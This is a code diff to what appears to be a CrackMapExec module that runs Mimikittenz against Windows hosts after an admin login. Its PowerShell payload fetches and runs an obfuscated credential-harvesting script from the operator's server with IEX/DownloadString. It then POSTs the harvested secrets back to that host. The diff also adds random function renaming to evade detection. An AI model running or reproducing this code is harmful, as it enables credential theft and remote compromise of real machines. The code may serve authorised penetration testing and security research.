@@ -1,4 +1,4 @@
-from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script, write_log
+from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script, write_log, gen_random_string
 from StringIO import StringIO
 from datetime import datetime
 from sys import exit
@@ -13,17 +13,17 @@ class CMEModule:
 
     description = "Executes Mimikittenz"
 
-    chain_support = False
-
     def options(self, context, module_options):
         '''
         '''
-        return
 
-    def launcher(self, context, command):
-        launcher = '''
+        self.obfs_name = gen_random_string()
+
+    def on_admin_login(self, context, connection):
+
+        payload = '''
         IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-mimikittenz.ps1');
-        $data = Invoke-Mimikittenz;
+        $data = Invoke-{command};
         $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
         $request.Method = 'POST';
         $request.ContentType = 'application/x-www-form-urlencoded';
@@ -34,24 +34,22 @@ class CMEModule:
         $requestStream.Close();
         $request.GetResponse();'''.format(server=context.server, 
                                           port=context.server_port, 
-                                          addr=context.localip)
+                                          addr=context.localip,
+                                          command=self.obfs_name)
 
-        return create_ps_command(launcher)
+        context.log.debug('Payload: {}'.format(payload))
+        payload = create_ps_command(payload)
+        connection.execute(payload)
+        context.log.success('Executed payload')
 
-    def payload(self, context, command):
-        with open(get_ps_script('mimikittenz/Invoke-mimikittenz.ps1'), 'r') as ps_script:
-            return obfs_ps_script(ps_script.read())
-
-    def on_admin_login(self, context, connection, launcher, payload):
-        connection.execute(launcher)
-        context.log.success('Executed launcher')
-
-    def on_request(self, context, request, launcher, payload):
+    def on_request(self, context, request):
         if 'Invoke-mimikittenz.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
 
-            request.wfile.write(payload)
+            with open(get_ps_script('mimikittenz/Invoke-mimikittenz.ps1'), 'r') as ps_script:
+                ps_script = obfs_ps_script(ps_script.read(), function_name=self.obfs_name)
+                request.wfile.write(ps_script)
 
         else:
             request.send_response(404)
